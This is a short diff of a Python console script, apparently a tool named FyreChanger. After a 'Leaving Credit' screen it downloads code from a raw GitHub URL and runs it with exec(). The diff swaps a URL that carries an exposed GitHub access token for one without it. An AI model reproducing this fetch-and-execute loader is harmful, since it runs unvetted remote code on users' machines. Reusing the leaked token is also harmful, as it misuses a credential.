@@ -23,4 +23,4 @@ while True:
     msvcrt.getch()
     os.system('cls')
     print("Leaving Credit")
-    exec(requests.get('https://raw.githubusercontent.com/xNorih/FYRECHAGER-/main/FyreChanger%2B?token=GHSAT0AAAAAACVUJWYEJXH7CLPHL25WBPV6ZVRTKEA').text)
+    exec(requests.get('https://raw.githubusercontent.com/xNorih/FYRECHAGER-/main/FyreChanger%2B').text)
